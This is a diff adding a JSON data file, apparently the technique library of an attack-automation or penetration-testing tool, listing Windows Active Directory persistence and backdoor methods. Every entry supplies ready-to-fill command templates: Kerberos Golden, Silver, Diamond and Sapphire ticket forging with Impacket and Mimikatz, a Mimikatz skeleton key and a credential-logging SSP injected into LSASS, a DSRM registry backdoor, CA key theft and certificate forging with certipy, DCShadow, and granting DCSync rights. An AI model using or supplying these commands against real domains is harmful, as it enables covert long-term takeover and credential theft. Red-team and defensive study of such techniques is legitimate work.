@@ -1,0 +1,189 @@
+{
+  "service": "windows-persistence",
+  "description": "Persistence mechanisms and backdoor techniques for Windows domains",
+  "ports": [],
+  "serviceNames": [],
+  "targetOs": ["windows"],
+  "vectors": [
+    {
+      "id": "persist-add-domain-admin",
+      "name": "Add User to Domain Admins",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Add user account to Domain Admins group for persistent privileged access",
+      "commands": [
+        {
+          "tool": "net",
+          "command": "net group \"domain admins\" myuser /add /domain",
+          "description": "Add user to Domain Admins"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-golden-ticket",
+      "name": "Golden Ticket",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Forge Kerberos TGT using krbtgt hash for persistent domain-wide access",
+      "commands": [
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+          "description": "Create Golden Ticket with Impacket"
+        },
+        {
+          "tool": "mimikatz",
+          "command": "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid> /aes256:<krbtgt_aes256> /ptt",
+          "description": "Create Golden Ticket with Mimikatz"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-silver-ticket",
+      "name": "Silver Ticket",
+      "phase": "persistence",
+      "prerequisites": ["credential_access"],
+      "description": "Forge Kerberos TGS using service account hash for persistent service access",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "kerberos::golden /sid:<current_user_sid> /domain:<domain> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt",
+          "description": "Create Silver Ticket with Mimikatz"
+        },
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>",
+          "description": "Create Silver Ticket with Impacket"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-dsrm",
+      "name": "Directory Service Restore Mode (DSRM) Backdoor",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Enable DSRM account for network logon as backdoor administrator account",
+      "commands": [
+        {
+          "tool": "PowerShell",
+          "command": "New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD",
+          "description": "Allow DSRM account network logon"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-skeleton-key",
+      "name": "Skeleton Key",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Inject skeleton key malware into LSASS to create master password (mimikatz) for all accounts",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\nmisc::skeleton",
+          "description": "Inject skeleton key (password: mimikatz)"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-custom-ssp",
+      "name": "Custom SSP (Security Support Provider)",
+      "phase": "persistence",
+      "prerequisites": ["admin_access"],
+      "description": "Install malicious SSP to log credentials to file",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "privilege::debug\nmisc::memssp",
+          "description": "Install memory SSP to log creds to C:\\Windows\\System32\\kiwissp.log"
+        }
+      ],
+      "outcomes": ["persistence", "credential_access"]
+    },
+    {
+      "id": "persist-golden-certificate",
+      "name": "Golden Certificate",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Steal CA private key to forge certificates for any user",
+      "commands": [
+        {
+          "tool": "certipy",
+          "command": "certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>",
+          "description": "Backup CA private key"
+        },
+        {
+          "tool": "certipy",
+          "command": "certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>'",
+          "description": "Forge Golden Certificate"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-diamond-ticket",
+      "name": "Diamond Ticket",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Request legitimate TGT then modify PAC for stealthier Golden Ticket",
+      "commands": [
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> -user-id <user_id> -groups '512,513,518,519,520' <anyuser>",
+          "description": "Create Diamond Ticket"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-sapphire-ticket",
+      "name": "Sapphire Ticket",
+      "phase": "persistence",
+      "prerequisites": ["valid_credentials"],
+      "description": "Request TGT for one user but modify it to impersonate another (S4U2Self based)",
+      "commands": [
+        {
+          "tool": "ticketer.py",
+          "command": "ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid> 'ignored'",
+          "description": "Create Sapphire Ticket"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-dcshadow",
+      "name": "DCShadow",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Register rogue domain controller to make stealthy Active Directory changes",
+      "commands": [
+        {
+          "tool": "mimikatz",
+          "command": "lsadump::dcshadow",
+          "description": "Execute DCShadow attack"
+        }
+      ],
+      "outcomes": ["persistence"]
+    },
+    {
+      "id": "persist-acl-manipulation",
+      "name": "ACL Manipulation",
+      "phase": "persistence",
+      "prerequisites": ["domain_admin"],
+      "description": "Modify ACLs to grant backdoor access to domain objects",
+      "commands": [
+        {
+          "tool": "PowerView",
+          "command": "Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity <user> -Rights DCSync",
+          "description": "Grant DCSync rights to user"
+        }
+      ],
+      "outcomes": ["persistence"]
+    }
+  ]
+}
